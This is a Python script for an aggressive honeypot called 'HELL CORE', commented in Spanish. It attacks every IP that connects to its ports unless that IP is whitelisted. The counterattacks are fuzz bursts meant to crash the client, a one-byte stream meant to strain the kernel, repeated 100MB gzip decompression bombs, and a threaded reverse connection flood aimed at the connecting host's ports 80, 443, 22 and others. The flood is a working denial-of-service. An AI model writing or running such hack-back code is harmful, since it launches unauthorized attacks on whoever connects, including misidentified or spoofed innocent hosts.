import socket
import threading
import time
import random
import os
import gzip
import io
from ai_module import GeminiDefender
from threat_intel import VirusTotalReporter

# CONFIGURACIÓN HELL: LETHAL LINUX EDITION
HOST = '0.0.0.0'
LETHAL_PORTS = [2222, 3389, 4455]
PORTS = [8080, 2525, 3306, 6379] + LETHAL_PORTS
LOG_FILE = "logs/hell_activity.log"

USE_AI = os.getenv("USE_AI", "false").lower() == "true"
GEMINI_KEY = os.getenv("GEMINI_API_KEY", "")
VT_KEY = os.getenv("VT_API_KEY", "")
MY_IP = os.getenv("MY_IP", "127.0.0.1")

class HellServer:
    def __init__(self):
        self.defender = GeminiDefender(GEMINI_KEY) if USE_AI else None
        self.reporter = VirusTotalReporter(VT_KEY)
        self.whitelist = {MY_IP, "127.0.0.1"}
        print(f"[💀] HELL CORE v1.3.0: MODO FATIGA LINUX ACTIVADO")

    def log_event(self, message):
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] {message}\n")
        print(message)

    def protocol_fuzzer(self, client_socket):
        """Envía ráfagas de bytes malformados para intentar colapsar el software del atacante"""
        fuzz_payloads = [
            b"\xff\xff\xff\xff\x00\x00\x00\x00", # Integer Overflow pattern
            b"\x41" * 1024, # Buffer stress
            os.urandom(512) # Pure entropy fuzzer
        ]
        try:
            for payload in fuzz_payloads:
                client_socket.send(payload)
                time.sleep(0.1)
        except: pass

    def linux_stress_stream(self, client_socket, addr):
        """Causa fatiga en el Kernel del atacante mediante interrupciones masivas (SWS)"""
        self.log_event(f"[⚡] INICIANDO STRESS DE CPU (Kernel Interruption) contra {addr[0]}")
        try:
            while True:
                # Enviamos 1 solo byte para forzar el procesamiento de paquetes pequeños
                client_socket.send(os.urandom(1))
                # Retraso extremadamente corto para maximizar interrupciones por segundo
                time.sleep(0.001) 
        except: pass

    def send_recursive_bomb(self, client_socket):
        """Envía un payload Gzip de alta recursividad (Matryoshka)"""
        try:
            # Crear un buffer de 100MB de ceros en memoria
            buffer = b"\x00" * (100 * 1024 * 1024)
            out = io.BytesIO()
            with gzip.GzipFile(fileobj=out, mode="w") as f:
                f.write(buffer)
            payload = out.getvalue()
            
            # Enviar la bomba repetidamente
            while True:
                client_socket.send(payload)
                time.sleep(1)
        except: pass

    def reverse_flood(self, target_ip):
        """Inundación de sockets inversa para agotar puertos efímeros del atacante"""
        ports = [80, 443, 22, 21, 445, 3389]
        def flood():
            for _ in range(500):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.2)
                    s.connect((target_ip, random.choice(ports)))
                    s.send(os.urandom(64))
                    time.sleep(5) # Mantener conexión para ocupar su FD (File Descriptor)
                    s.close()
                except: pass
        for _ in range(10): threading.Thread(target=flood, daemon=True).start()

    def handle_client(self, client_socket, addr, local_port):
        if addr[0] in self.whitelist:
            client_socket.close()
            return

        self.log_event(f"[*] Objetivo: {addr[0]} en puerto {local_port}")
        
        try:
            # Reportar a VirusTotal
            self.reporter.report_ip(addr[0])

            # ACTIVACIÓN DE PROTOCOL FUZZER INICIAL
            self.protocol_fuzzer(client_socket)

            if local_port in LETHAL_PORTS:
                self.reverse_flood(addr[0])
                self.linux_stress_stream(client_socket, addr)
                return

            if local_port == 2525: # SMTP Tarpit
                client_socket.send(b"220 hell.smtp ESMTP\r\n")
                time.sleep(10)
                self.linux_stress_stream(client_socket, addr)
            
            elif local_port in [3306, 6379]: # DB Tarpit
                self.send_recursive_bomb(client_socket)

            else: # Puerto 8080 (Web/IA)
                request = client_socket.recv(2048).decode('utf-8', errors='ignore')
                
                # IA o Bomba Recursiva
                is_bomb = any(x in request for x in ["backup", "admin", "config"])
                if is_bomb:
                    self.log_event(f"[💣] LANZANDO BOMBA RECURSIVA contra {addr[0]}")
                    header = "HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\n\r\n"
                    client_socket.send(header.encode())
                    self.send_recursive_bomb(client_socket)
                
                self.linux_stress_stream(client_socket, addr)

        except Exception as e:
            self.log_event(f"[!] Desconectado {addr[0]}: {e}")
        finally:
            client_socket.close()

    def start_listener(self, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, port))
        server.listen(100)
        while True:
            try:
                client, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client, addr, port)).start()
            except: pass

    def start(self):
        self.log_event(f"[✔] HELL CORE v1.3.0: Vigilando {len(PORTS)} puertos (Modo Agresivo).")
        for port in PORTS:
            threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
        while True: time.sleep(1)

if __name__ == "__main__":
    HellServer().start()
